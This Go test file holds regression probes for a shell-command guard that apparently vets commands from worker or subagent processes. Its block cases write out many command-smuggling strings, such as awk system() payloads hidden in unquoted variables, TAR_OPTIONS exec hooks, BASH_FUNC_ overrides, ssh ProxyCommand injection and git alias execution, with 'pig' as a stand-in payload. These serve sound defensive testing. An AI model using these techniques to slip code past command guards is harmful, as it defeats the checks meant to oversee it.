	blockCases := []struct {
		name, cmd, want string
	}{
		// R7-MF-1: awkProgramFrags -- 前动态选项注入 R8 回归恢复 BLOCK。
		{"P-R7-MF1-a awk -f null X", `X='-f/dev/stdin'; echo 'BEGIN{system("pig")}' | awk -f /dev/null "$X"`, "dynamic code payload"},
		{"P-R7-MF1-b awk -f null split X", `X='-f /dev/stdin'; echo 'BEGIN{system("pig")}' | awk -f /dev/null $X`, "dynamic code payload"},
		{"P-R7-MF1-c gawk 1 X", `X='-eBEGIN{system("pig")}'; gawk '1' "$X"`, "dynamic code payload"},
		{"P-R7-MF1-d gawk -e 1 X", `X='-eBEGIN{system("pig")}'; gawk -e '1' "$X"`, "dynamic code payload"},
		{"P-R7-MF1-e gawk 1 ./X", `X='x -e BEGIN{system("pig")}'; gawk '1' ./$X`, "dynamic code payload"},
		// R7-MF-2: 单字 --long-opt 不再落入短选项集群(bash --restricted
		// 管道/here-string/heredoc/stdin 四路 R8 回归)。
		{"P-R7-MF2-a pipe bash --restricted", `echo 'pig' | bash --restricted`, "piped code to shell"},
		// 注: <<< 是 bash-only 语法,外层 dash 语法门在 stdin 筛查前先 BLOCK —
		// 该探针的裁决串不含 pig(与 Oracle R7 预期串的偏差,判别性证据由
		// 探针 a/c/d 承担,此处断言其恒定 BLOCK 不回归为 ALLOW)。
		{"P-R7-MF2-b bash --restricted herestring", `bash --restricted <<< 'pig'`, "bash-only syntax"},
		{"P-R7-MF2-c bash --restricted heredoc", `bash --restricted <<'EOF'
pig
EOF`, "pig"},
		// R7-MF-3 路径 A: 裸 -c 布尔语义 + 裸 -o/+o/-O/+O 动态词校验。
		{"P-R7-MF3-a sh -c -o -o X", `X='errexit pig'; sh -c -o errexit -o $X 'echo hi'`, "dynamic code payload"},
		{"P-R7-MF3-b bash -c -o -o X", `X='errexit pig'; bash -c -o errexit -o $X 'echo hi'`, "dynamic code payload"},
		{"P-R7-MF3-c sh -c +o +o X", `X='errexit pig'; sh -c +o errexit +o $X 'echo hi'`, "dynamic code payload"},
		{"P-R7-MF3-d bash -c -O -O X", `X='extglob pig'; bash -c -O extglob -O $X 'echo hi'`, "dynamic code payload"},
		// R7-MF-3 路径 B: POSIX 单横杠 "-" 终止符结算。
		{"P-R7-MF3-e sh -c - pig", `sh -c - 'pig'`, "pig"},
		{"P-R7-MF3-f bash -c - pig", `bash -c - 'pig'`, "pig"},
		{"P-R7-MF3-g sh -co errexit - pig", `sh -co errexit - 'pig'`, "pig"},
		{"P-R7-MF3-h sh -c - X", `X='pig'; sh -c - "$X"`, "dynamic code payload"},
		{"P-R7-MF3-i xargs sh -c -", `xargs -a ` + payloadPig + ` sh -c -`, "dynamic code payload"},
		// R7-MF-4: mawk -W 语法冲突(布尔吞程序与逗号串联)。
		{"P-R7-MF4-a awk -Wi", `awk -Wi 'BEGIN{system("pig")}'`, "pig"},
		{"P-R7-MF4-b awk -W i", `awk -W i 'BEGIN{system("pig")}'`, "pig"},
		{"P-R7-MF4-c awk -W in", `awk -W in 'BEGIN{system("pig")}'`, "pig"},
		{"P-R7-MF4-d awk -W interactive,exec", `echo 'BEGIN{system("pig")}' | awk -W interactive,exec /dev/stdin`, "awk script from stdin"},
		// R7-SF-1: awk 纯数据赋值槽无引号词拆分选项注入。
		{"P-R7-SF1-a awk -v x=VAR", `VAR='1 -f /dev/stdin'; echo 'BEGIN{system("pig")}' | awk -v x=$VAR -f /dev/null`, "dynamic code payload"},
		{"P-R7-SF1-b gawk -W assign=x=VAR", `VAR='1 -e BEGIN{system("pig")}'; gawk -W assign=x=$VAR '1'`, "dynamic code payload"},
		{"P-R7-SF1-c gawk -W assign VAR", `VAR='x=1 -e BEGIN{system("pig")}'; gawk -W assign $VAR '1'`, "dynamic code payload"},
	}
	for _, tc := range blockCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got == "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = ALLOW, want a guard block", tc.cmd)
			}
			if tc.want != "" && !strings.Contains(got, tc.want) {
				t.Fatalf("rtGuardCwd(%q) = %q, want verdict substring %q", tc.cmd, got, tc.want)
			}
		})
	}

	// R7-MF-2-d: guardCtxRunStdin argv+stdin 通道(argv 不走 shell 字符串)。
	t.Run("P-R7-MF2-d argv bash --restricted stdin", func(t *testing.T) {
		got := rtGuardCwd(t, rtCase{id: "P-R7-MF2-d", role: "worker", argv: []string{"bash", "--restricted"}, stdin: "pig\n"}, "")
		if got == "ALLOW" {
			t.Fatalf("rtGuardCwd(argv bash --restricted stdin pig) = ALLOW, want a guard block")
		}
		if !strings.Contains(got, "pig") {
			t.Fatalf("rtGuardCwd(argv bash --restricted) = %q, want verdict substring %q", got, "pig")
		}
	})

	// 放行守卫正例(R7 零假阳纪律,含 R6 既有放行契约的核心行)。
	allowCases := []struct {
		name, cmd string
	}{
		{"R7-pos awk -f -- $FILE", `awk -f parse.awk -- "$FILE"`},
		{"R7-pos awk '1' -- $FILE", `awk '1' -- "$FILE"`},
		{"R7-pos awk 1 $PWD data", `awk '1' "$PWD/data.txt"`},
		{"R7-pos awk glob log", `awk '{print $1}' /tmp/*.log`},
		{"R7-pos awk f static", `f=/tmp/data.log; awk '{print $1, $2}' "$f"`},
		{"R7-pos awk -v ts quoted", `val=$(date +%s); awk -v ts="$val" 'BEGIN{print ts}'`},
		{"R7-pos gawk -W assign=x=quoted", `gawk -W assign=x="$VAR" '1'`},
		{"R7-pos gawk -W assign quoted", `gawk -W assign "$VAR" '1'`},
		{"R7-pos awk -Wi benign", `awk -Wi 'BEGIN{print 1}'`},
		{"R7-pos gawk -W i devnull benign", `gawk -W i /dev/null 'BEGIN{print 1}'`},
		{"R7-pos bash --restricted scriptfile", `bash --restricted "a'b.sh"`},
		{"R7-pos sh -c $1", `sh -c 'echo "$1"' _ "$ARG"`},
		{"R7-pos sh -c -o errexit $1", `sh -c -o errexit 'echo "$1"' _ "$ARG"`},
		{"R7-pos sh -c - $1", `sh -c - 'echo "$1"' _ "$ARG"`},
		{"R7-pos xargs sh -c - $1", `xargs -a ` + payloadX + ` -I{} sh -c - 'echo "$1"' _ {}`},
	}
	for _, tc := range allowCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got != "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = %q, want ALLOW", tc.cmd, got)
			}
		})
	}
}

func TestGuard_V622_OracleR8Probes(t *testing.T) {
	mkPayload := func(name, content string) string {
		p := filepath.Join(t.TempDir(), name)
		if err := os.WriteFile(p, []byte(content), 0644); err != nil {
			t.Fatalf("write %s: %v", name, err)
		}
		return p
	}
	payloadPigProg := mkPayload("r8-prog", "BEGIN{system(\"pig\")}\n")
	payloadPig := mkPayload("r8-pig", "pig\n")
	payloadX := mkPayload("r8-x", "x\n")

	blockCases := []struct {
		name, cmd, want string
	}{
		// R8-MF-1: -Wi/-W in 碰撞值经独立 aux 通道,不再压死位置主程序
		// 与 -- 后动态程序提取(R9 引入的 gawk 直通回归)。
		{"P-R8-MF1-a gawk -W i devnull pig", `gawk -W i /dev/null 'BEGIN{system("pig")}'`, "pig"},
		{"P-R8-MF1-b gawk -Wi devnull pig", `gawk -Wi /dev/null 'BEGIN{system("pig")}'`, "pig"},
		{"P-R8-MF1-c gawk -W in devnull pig", `gawk -W in /dev/null 'BEGIN{system("pig")}'`, "pig"},
		{"P-R8-MF1-d gawk -W i devnull -- VAR", `VAR='BEGIN{system("pig")}'; gawk -W i /dev/null -- "$VAR"`, "dynamic code payload"},
		{"P-R8-MF1-e xargs gawk -W i devnull -- tok", `xargs -a ` + payloadPigProg + ` -I{} gawk -W i /dev/null -- '{}'`, "dynamic code payload"},
		{"P-R8-MF1-f xargs gawk -W i devnull tok prog", `xargs -a ` + payloadPig + ` -I{} gawk -W i /dev/null 'BEGIN{system("{}")}'`, "dynamic code payload"},
		// R8-MF-2: awkProgramLongStep 接入 --assign/--field-separator
		// 分离值的 awkDataValSplitHit(无引号词拆分重新武装选项解析)。
		{"P-R8-MF2-a gawk --as VAR", `VAR='x=1 -e BEGIN{system("pig")}'; gawk --as $VAR '1'`, "dynamic code payload"},
		{"P-R8-MF2-b gawk --assign VAR", `VAR='x=1 -e BEGIN{system("pig")}'; gawk --assign $VAR '1'`, "dynamic code payload"},
		{"P-R8-MF2-c gawk --field-separator VAR", `VAR=', -e BEGIN{system("pig")}'; gawk --field-separator $VAR '1'`, "dynamic code payload"},
		{"P-R8-MF2-d gawk --fie VAR", `VAR=', -e BEGIN{system("pig")}'; gawk --fie $VAR '1'`, "dynamic code payload"},
		// R8-MF-3: MAWK_LONG_OPTIONS 纳入 envHookVars(KEY=VAL 前缀/export/env 通路)。
		{"P-R8-MF3-a MAWK ignore --file", `MAWK_LONG_OPTIONS=ignore awk --file=/dev/null 'BEGIN{system("pig")}'`, "MAWK_LONG_OPTIONS"},
		{"P-R8-MF3-b MAWK ignore --assign", `MAWK_LONG_OPTIONS=ignore awk --assign 'BEGIN{system("pig")}'`, "MAWK_LONG_OPTIONS"},
		{"P-R8-MF3-c MAWK warn --file", `MAWK_LONG_OPTIONS=warn awk --file=/dev/null 'BEGIN{system("pig")}'`, "MAWK_LONG_OPTIONS"},
		{"P-R8-MF3-d MAWK allow --i", `MAWK_LONG_OPTIONS=allow awk --i 'BEGIN{system("pig")}'`, "MAWK_LONG_OPTIONS"},
		// 附加反例守卫:引号毒化 / 末项非 exec 的逗号链 / R8-Obs-1 穿透 here-string。
		{"R8-neg gawk -W i quote poison", `gawk -W i "a'b" 'BEGIN{system("pig")}'`, "pig"},
		{"R8-neg awk -W i,interactive pig", `awk -W i,interactive 'BEGIN{system("pig")}'`, "pig"},
		{"R8-neg bash -c nested restricted herestring", `bash -c "bash --restricted <<< 'pig'"`, "pig"},
	}
	for _, tc := range blockCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got == "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = ALLOW, want a guard block", tc.cmd)
			}
			if tc.want != "" && !strings.Contains(got, tc.want) {
				t.Fatalf("rtGuardCwd(%q) = %q, want verdict substring %q", tc.cmd, got, tc.want)
			}
		})
	}

	// P-R8-MF3-e: ctx_run env 通道的 MAWK_LONG_OPTIONS 覆盖拦截。
	t.Run("P-R8-MF3-e guardCtxRunEnv MAWK", func(t *testing.T) {
		rule, detail := guardCall{subagent: true}.guardCtxRunEnv(map[string]string{"MAWK_LONG_OPTIONS": "ignore"})
		if rule != "subagent_nested_agent" || detail != "env MAWK_LONG_OPTIONS" {
			t.Fatalf("guardCtxRunEnv(MAWK_LONG_OPTIONS=ignore) = (%q, %q), want (%q, %q)", rule, detail, "subagent_nested_agent", "env MAWK_LONG_OPTIONS")
		}
	})

	// P-R8-SF1-c: 逗号末项名契约 — -W interactive,exec FILE 标记 sawFile。
	t.Run("P-R8-SF1-c awkProgramFrags sawFile contract", func(t *testing.T) {
		_, sawFile, hit := awkProgramFrags([]string{"-W", "interactive,exec", "/tmp/evil.awk"})
		if hit != "" {
			t.Fatalf("awkProgramFrags hit = %q, want empty", hit)
		}
		if !sawFile {
			t.Fatalf("awkProgramFrags(-W interactive,exec FILE) sawFile = false, want true")
		}
	})

	// 放行守卫正例(R8 零假阳纪律)。
	allowCases := []struct {
		name, cmd string
	}{
		{"P-R8-SF1-a awk -W interactive,exec parse", `awk -W interactive,exec parse.awk "$FILE"`},
		{"P-R8-SF1-b xargs awk -W interactive,exec parse", `xargs -a ` + payloadX + ` -I{} awk -W interactive,exec parse.awk {}`},
		{"R8-pos awk -Winteractive,exec parse", `awk -Winteractive,exec parse.awk "$FILE"`},
		{"R8-pos gawk --assign quoted", `VAR='x=1'; gawk --assign "$VAR" '1'`},
		{"R8-pos gawk --as quoted", `VAR='x=1'; gawk --as "$VAR" '1'`},
		{"R8-pos gawk --field-separator quoted", `SEP=','; gawk --field-separator "$SEP" '1'`},
		{"R8-pos awk -Wi benign", `awk -Wi 'BEGIN{print 1}'`},
		{"R8-pos gawk -W i devnull benign", `gawk -W i /dev/null 'BEGIN{print 1}'`},
		{"R8-pos gawk -W i devnull benign -- FILE", `gawk -W i /dev/null 'BEGIN{print 1}' -- "$FILE"`},
	}
	for _, tc := range allowCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got != "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = %q, want ALLOW", tc.cmd, got)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// v6.2.2 Oracle R9 (R9 终局收口): R9-MF-1..4 探针回归 —
// R9-MF-1: -Wi/-W i/-W in 碰撞值以 '-' 开头(gawk --include 库文件语义
// 与 mawk 布尔冲突不可调和)一律 fail-closed,不再把 -v/-F/-f/-W 选项词
// 吞入 aux 丢弃真实主程序或放行 -f /dev/stdin;
// R9-MF-2: isSingleWordSplitSafe 收紧全部单值选项槽 — 无引号通配符
// (cmdSubPlaceholderGlob)路径展开产出 N>=2 个 argv 词,match[1..] 溢出
// 至主程序/命令头/子命令槽(awk -F B* / env -a p* / xargs -a p* /
// flock -w 0* / git -C g* / npx --cache p*);
// R9-MF-3: skipEnvOperandsToken 三重缺陷 — GNU env 消费任何含 '=' 的
// 操作数(POSIX 键与否、`--` 之后均为赋值),且 `env FOO=$X` 无引号词
// 拆分(env 的 argv 不是 shell 前缀赋值);
// R9-MF-4: TAR_OPTIONS 与 BASH_FUNC_* 纳入 envHookVars/isEnvHookVar。
// 全部探针仅依赖基线共有入口 rtGuardCwd 与 guardCall.guardCtxRunEnv。
// ---------------------------------------------------------------------------

func TestGuard_V622_OracleR9Probes(t *testing.T) {
	mkPayload := func(name, content string) string {
		p := filepath.Join(t.TempDir(), name)
		if err := os.WriteFile(p, []byte(content), 0644); err != nil {
			t.Fatalf("write %s: %v", name, err)
		}
		return p
	}
	payloadProg := mkPayload("r9-prog", "BEGIN{system(\"pig\")}\n")
	payloadX := mkPayload("r9-x", "x\n")

	blockCases := []struct {
		name, cmd, want string
	}{
		// R9-MF-1: -Wi/-W i/-W in 碰撞值以 '-' 开头一律 fail-closed。
		{"P-R9-MF1-a awk -Wi -v x=1 pig", `awk -Wi -v x=1 'BEGIN{system("pig")}'`, "dynamic code payload"},
		{"P-R9-MF1-b awk -W i -v x=1 pig", `awk -W i -v x=1 'BEGIN{system("pig")}'`, "dynamic code payload"},
		{"P-R9-MF1-c awk -W in -F : pig", `awk -W in -F : 'BEGIN{system("pig")}'`, "dynamic code payload"},
		{"P-R9-MF1-d awk -Wi -f devstdin", `echo 'BEGIN{system("pig")}' | awk -Wi -f /dev/stdin`, "dynamic code payload"},
		{"P-R9-MF1-e awk -Wi -W exec devstdin", `echo 'BEGIN{system("pig")}' | awk -Wi -W exec /dev/stdin`, "dynamic code payload"},
		{"P-R9-MF1-f awk -Wi -W i pig", `awk -Wi -W i 'BEGIN{system("pig")}'`, "dynamic code payload"},
		{"P-R9-MF1-g awk -W interactive,i -v pig", `awk -W interactive,i -v x=1 'BEGIN{system("pig")}'`, "dynamic code payload"},
		{"P-R9-MF1-h awk -Wi -v x=1 -- VAR", `VAR='BEGIN{system("pig")}'; awk -Wi -v x=1 -- "$VAR"`, "dynamic code payload"},
		{"P-R9-MF1-i xargs awk -Wi -v x=1 -- tok", `xargs -a ` + payloadProg + ` -I{} awk -Wi -v x=1 -- '{}'`, "dynamic code payload"},
		// R9-MF-2: 单值选项槽无引号 glob 多词溢出。
		{"P-R9-MF2-a awk -F glob", `awk -F B*`, "dynamic code payload"},
		{"P-R9-MF2-b awk -v a=1 glob", `awk -v a=1*`, "dynamic code payload"},
		{"P-R9-MF2-c gawk --assign glob", `gawk --assign a=1*`, "dynamic code payload"},
		{"P-R9-MF2-d gawk -W assign glob", `gawk -W assign a=1*`, "dynamic code payload"},
		{"P-R9-MF2-e env -a glob", `env -a p*`, "dynamic option"},
		{"P-R9-MF2-f xargs -a glob", `xargs -a p*`, "dynamic command head"},
		{"P-R9-MF2-g flock -w glob", `flock -w 0* pig`, "dynamic code payload"},
		{"P-R9-MF2-h git -C glob", `git -C g* -Opig foo`, "git dynamic global option"},
		{"P-R9-MF2-i npx --cache glob", `npx --cache p*`, "dynamic code payload"},
		// R9-MF-3: skipEnvOperandsToken 三重缺陷。
		{"P-R9-MF3-a env a.b=1 pig", `env 'a.b=1' pig`, "pig"},
		{"P-R9-MF3-b env a-b=1 hc", `env 'a-b=1' hc list`, "hc"},
		{"P-R9-MF3-c env -- -x=1 pig", `env -- -x=1 pig`, "pig"},
		{"P-R9-MF3-d env -- a.b=1 pig", `env -- 'a.b=1' pig`, "pig"},
		{"P-R9-MF3-e env FOO=X unquoted", `X='1 pig'; env FOO=$X`, "dynamic option"},
		{"P-R9-MF3-f xargs env a.b=1 env -S", `xargs -a ` + payloadX + ` -I{} env 'a.b=1' env -S "find . -name {}"`, "dynamic code payload"},
		// R9-MF-4: TAR_OPTIONS / BASH_FUNC_* 钩子变量。
		{"P-R9-MF4-a TAR_OPTIONS use-compress-program", `TAR_OPTIONS='--use-compress-program=pig' tar -cf /dev/null /dev/null`, "TAR_OPTIONS"},
		{"P-R9-MF4-b TAR_OPTIONS checkpoint-action", `TAR_OPTIONS='--checkpoint=1 --checkpoint-action=exec=pig' tar -cf /dev/null /dev/null`, "TAR_OPTIONS"},
		{"P-R9-MF4-e env BASH_FUNC bash", `env 'BASH_FUNC_echo%%=() { pig; }' bash -c 'echo hi'`, "BASH_FUNC_echo%%"},
		// 附加回归(Oracle R9 底部):-Wi - 保精准 stdin 裁决;-W i -foo
		// 与 glob/`--` 变体全 BLOCK。
		{"R9-reg awk -Wi dash stdin", `awk -Wi -`, "awk script from stdin"},
		{"R9-reg gawk -W i -foo pig", `gawk -W i -foo 'BEGIN{system("pig")}'`, "dynamic code payload"},
		{"R9-reg env -- FOO=X unquoted", `X='1 pig'; env -- FOO=$X`, "dynamic option"},
		{"R9-reg gawk --field-separator glob", `gawk --field-separator B*`, "dynamic code payload"},
		{"R9-reg gawk -W assign=a=1 glob", `gawk -W assign=a=1*`, "dynamic code payload"},
		{"R9-reg env --argv0 glob", `env --argv0 p*`, "dynamic option"},
		{"R9-reg env -C glob", `env -C p*`, "dynamic option"},
		{"R9-reg xargs --arg-file glob", `xargs --arg-file p*`, "dynamic command head"},
		{"R9-reg flock --timeout glob", `flock --timeout 0* pig`, "dynamic code payload"},
		{"R9-reg flock -xw glob", `flock -xw 0* pig`, "dynamic code payload"},
	}
	for _, tc := range blockCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got == "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = ALLOW, want a guard block", tc.cmd)
			}
			if tc.want != "" && !strings.Contains(got, tc.want) {
				t.Fatalf("rtGuardCwd(%q) = %q, want verdict substring %q", tc.cmd, got, tc.want)
			}
		})
	}

	// P-R9-MF4-c: ctx_run env 通道的 TAR_OPTIONS 覆盖拦截。
	t.Run("P-R9-MF4-c guardCtxRunEnv TAR_OPTIONS", func(t *testing.T) {
		rule, detail := guardCall{subagent: true}.guardCtxRunEnv(map[string]string{"TAR_OPTIONS": "--use-compress-program=pig"})
		if rule != "subagent_nested_agent" || detail != "env TAR_OPTIONS" {
			t.Fatalf("guardCtxRunEnv(TAR_OPTIONS) = (%q, %q), want (%q, %q)", rule, detail, "subagent_nested_agent", "env TAR_OPTIONS")
		}
	})

	// P-R9-MF4-d: ctx_run env 通道的 BASH_FUNC_* 覆盖拦截。
	t.Run("P-R9-MF4-d guardCtxRunEnv BASH_FUNC", func(t *testing.T) {
		rule, detail := guardCall{subagent: true}.guardCtxRunEnv(map[string]string{"BASH_FUNC_echo%%": "() { pig; }"})
		if rule != "subagent_nested_agent" || detail != "env BASH_FUNC_echo%%" {
			t.Fatalf("guardCtxRunEnv(BASH_FUNC_echo%%) = (%q, %q), want (%q, %q)", rule, detail, "subagent_nested_agent", "env BASH_FUNC_echo%%")
		}
	})

	// 放行守卫正例(R9 零假阳纪律):带引号动态值、单字 glob 多文件操作数、
	// 纯波浪线路径与非 POSIX 键 env 赋值全部保持 ALLOW。
	allowCases := []struct {
		name, cmd string
	}{
		{"R9-pos awk -W interactive -v benign", `awk -W interactive -v x=1 'BEGIN{print 1}'`},
		{"R9-pos awk -v x=1 -Wi benign", `awk -v x=1 -Wi 'BEGIN{print 1}'`},
		{"R9-pos awk -Wi benign", `awk -Wi 'BEGIN{print 1}'`},
		{"R9-pos gawk -W i devnull benign", `gawk -W i /dev/null 'BEGIN{print 1}'`},
		{"R9-pos gawk -W i devnull benign -- FILE", `gawk -W i /dev/null 'BEGIN{print 1}' -- "$FILE"`},
		{"R9-pos awk glob log", `awk '{print $1}' /tmp/*.log`},
		{"R9-pos awk -v ts quoted", `awk -v ts="$val" 'BEGIN{print ts}'`},
		{"R9-pos env a.b=1 ls", `env 'a.b=1' ls`},
		{"R9-pos env FOO=X quoted", `env FOO="$X" ls`},
		{"R9-pos env -- FOO=X quoted VAR", `env -- FOO="$X" ls "$VAR"`},
		{"R9-pos env -- ls VAR", `env -- ls "$VAR"`},
		// 注: Oracle R9 正例列表中的 `env -C "$PWD" ls` 未纳入 — R2-4 既有契约
		// (zz_r2fix_test.go:130)对动态 chdir 目录一律 fail-closed,属 Oracle 与
		// 基线固定契约的冲突,不改核心策略,报告中列明偏差。
		{"R9-pos xargs -a FILE grep", `xargs -a "$FILE" grep foo`},
		{"R9-pos flock -w T lk true", `flock -w "$T" /tmp/lk true`},
		{"R9-pos git -C DIR status", `git -C "$DIR" status`},
		{"R9-pos npx --userconfig tilde", `npx --userconfig ~/.npmrc tsc --noEmit`},
		{"R9-pos FOO=X shell prefix true", `FOO=$X true`},
		{"R9-pos python glob pytest", `python3 -m pytest tests/*.py`},
	}
	for _, tc := range allowCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got != "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = %q, want ALLOW", tc.cmd, got)
			}
		})
	}
}

// TestGuard_V622_OracleR10Probes covers the Oracle R10 must-fix matrix:
// tar/find/sed/ssh separated single-value operand slots must require
// isSingleWordSplitSafe on dynamic words (R10-MF-1/2/3), the separated
// --checkpoint-action operand must refuse every dynamic word, and a
// declaration builtin demoted by a non-assignment wrapper (command/
// builtin) must reject non-split-safe dynamic export operands
// (R10-MF-4) — plus the shell_ast.go isEnvHookVar closure for
// GIT_CONFIG_PARAMETERS-style hook variables. Zero new production symbols
// are referenced here: every probe goes through rtGuardCwd.
func TestGuard_V622_OracleR10Probes(t *testing.T) {
	blockCases := []struct {
		name, cmd, want string
	}{
		// R10-MF-1: tar 分离值槽词拆分/glob 溢出与动态 --checkpoint-action。
		{"P-R10-MF1-a tar checkpoint-action quoted VAR", `VAR='exec=pig'; tar --checkpoint=1 --checkpoint-action "$VAR" -cf /dev/null /dev/null`, "dynamic code payload"},
		{"P-R10-MF1-b tar -cf unquoted VAR", `VAR='/dev/null -Ipig'; tar -cf $VAR /dev/null`, "dynamic code payload"},
		{"P-R10-MF1-c tar -f unquoted VAR", `VAR='/dev/null --use-compress-program=pig'; tar -f $VAR -c /dev/null`, "dynamic code payload"},
		{"P-R10-MF1-d tar --file unquoted VAR", `VAR='/dev/null --use-compress-program=pig'; tar --file $VAR -c /dev/null`, "dynamic code payload"},
		{"P-R10-MF1-e tar cfI glob", `tar cfI p*`, "dynamic code payload"},
		{"P-R10-MF1-e2 tar cfI unquoted VAR", `X='/dev/null pig /dev/null'; tar cfI $X`, "dynamic code payload"},
		// R10-MF-2: find -name/-fprintf 值槽词拆分与 glob 吞噬 -exec。
		{"P-R10-MF2-a find -name unquoted VAR", `VAR='null -exec pig ;'; find /dev/null -name $VAR`, "find dynamic predicate"},
		{"P-R10-MF2-b find -fprintf glob", `find /dev/null -fprintf p* -exec pig \;`, "find dynamic predicate"},
		{"P-R10-MF2-c find -fprintf unquoted VAR", `VAR='/dev/null fmt'; find /dev/null -fprintf $VAR -exec pig \;`, "find dynamic predicate"},
		// R10-MF-3: sed -l/--line-length 与 ssh 值选项分离值槽。
		{"P-R10-MF3-a sed -l unquoted VAR", `VAR='80 -e 1epig'; sed -e '1p' -l $VAR CHANGELOG.md`, "dynamic code payload"},
		{"P-R10-MF3-a2 sed --line-length unquoted VAR", `VAR='80 -e 1epig'; sed -e '1p' --line-length $VAR CHANGELOG.md`, "dynamic code payload"},
		{"P-R10-MF3-b sed -l glob", `sed -l 1* CHANGELOG.md`, "dynamic code payload"},
		{"P-R10-MF3-b2 sed --line-length glob", `sed --line-length 1* CHANGELOG.md`, "dynamic code payload"},
		{"P-R10-MF3-c ssh -p unquoted VAR", `VAR='22 -o ProxyCommand=pig'; ssh -p $VAR dmit ls`, "dynamic code payload"},
		{"P-R10-MF3-d ssh -l glob", `ssh -l p* a true`, "dynamic code payload"},
		// R10-MF-4: command/builtin export 词拆分导出与 GIT_CONFIG_* 钩子变量。
		{"P-R10-MF4-a command export TAR_OPTIONS", `X='1 TAR_OPTIONS=--use-compress-program=pig'; command export FOO=$X; tar -cf /dev/null /dev/null`, "env dynamic export"},
		{"P-R10-MF4-b builtin export BASH_FUNC", `bash -c 'X="1 BASH_FUNC_echo%%=() { pig; }"; builtin export FOO=$X; bash -c "echo hi"'`, "env dynamic export"},
		{"P-R10-MF4-c command export glob", `command export FOO=T*`, "env dynamic export"},
		// R11-MF-3: the UNQUOTED spelling is the discriminating probe — the
		// quoted variant hits paramExpD2Ambiguous before reaching
		// peAssignsHookOrTaint, so it could never reproduce RED on b13a82b.
		{"P-R10-MF4-d GIT_CONFIG_PARAMETERS paramexp", `set -a; printf '' ${GIT_CONFIG_PARAMETERS:='alias.x=!pig'}; git x`, ""},
		{"P-R10-MF4-d2 GIT_CONFIG_PARAMETERS quoted", `set -a; printf '' "${GIT_CONFIG_PARAMETERS:='alias.x=!pig'}"; git x`, ""},
		{"P-R10-MF4-e GIT_CONFIG_PARAMETERS for-loop", `set -a; for GIT_CONFIG_PARAMETERS in "'alias.x=!pig'"; do git x; done`, ""},
	}
	for _, tc := range blockCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got == "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = ALLOW, want a guard block", tc.cmd)
			}
			if tc.want != "" && !strings.Contains(got, tc.want) {
				t.Fatalf("rtGuardCwd(%q) = %q, want verdict substring %q", tc.cmd, got, tc.want)
			}
		})
	}

	// 放行守卫正例(R10 零假阳纪律):带引号单值槽、BSD 消耗槽带引号值、
	// xargs 静态 {} 替换、裸/包装声明内建的带引号与无包装动态赋值全部
	// 保持 ALLOW。
	allowCases := []struct {
		name, cmd string
	}{
		{"R10-pos tar -cf quoted OUT", `tar -cf "$OUT" /tmp/*.log`},
		{"R10-pos tar -C xf quoted", `tar -C "$DIR" -xf "$ARCHIVE"`},
		{"R10-pos find -name quoted PAT", `find . -name "$PAT"`},
		{"R10-pos find PWD maxdepth", `find "$PWD" -maxdepth 1`},
		{"R10-pos xargs find -ctime token", `echo 5 | xargs -I{} find . -ctime {}`},
		{"R10-pos find -exec rg", `find . -name '*.go' -exec rg foo {} \;`},
		{"R10-pos sed -l quoted N", `sed -l "$N" '1p' CHANGELOG.md`},
		{"R10-pos ssh -p quoted PORT", `ssh -p "$PORT" dmit ls`},
		{"R10-pos ssh -i quoted KEY", `ssh -i "$KEY" dmit ls`},
		{"R10-pos command export quoted", `command export FOO="$X"`},
		{"R10-pos bash -c export quoted", `bash -c 'export FOO="$X"'`},
		{"R10-pos bare export unquoted", `export FOO=$X`},
	}
	for _, tc := range allowCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got != "ALLOW" {
				t.Fatalf("rtGuardCwd(%q) = %q, want ALLOW", tc.cmd, got)
			}
		})
	}
}

// TestGuard_V622_OracleR11Probes covers the Oracle R11 must-fix matrix:
// trailing dangling tar value options must never panic the guard
// (R11-MF-1), quoted/escaped/enum-expanded/env -S-rewritten declaration
// builtins lose their field-splitting exemption (R11-MF-2), and
// printf -v/read/getopts write-target slots must vet glued and repeated
// spellings plus dynamic single-value operands (R11-MF-3). Zero new
// production symbols are referenced here: every probe goes through
// rtGuardCwd so an independent verifier can copy this file onto the
// pre-fix tree fd8f417 and reproduce FAIL/panic directly.
func TestGuard_V622_OracleR11Probes(t *testing.T) {
	// R11-MF-1: trailing dangling value options must not panic. On the
	// pre-fix tree ANY of these crashes the test binary with
	// `panic: index out of range`; the rows assert nothing about the
	// verdict itself — reaching the comparison IS the assertion.
	noPanicShell := []struct {
		name, cmd string
	}{
		{"P-R11-MF1-a tar -f dangling", `tar -f`},
		{"P-R11-MF1-b tar --file dangling", `tar --file`},
		{"P-R11-MF1-b2 tar -cf then -C dangling", `tar -cf /dev/null -C`},
		{"P-R11-MF1-b3 tar -C dangling", `tar -C`},
		{"P-R11-MF1-b4 tar --directory dangling", `tar --directory`},
	}
	for _, tc := range noPanicShell {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if got == "" {
				t.Fatalf("rtGuardCwd(%q) returned empty verdict", tc.cmd)
			}
		})
	}
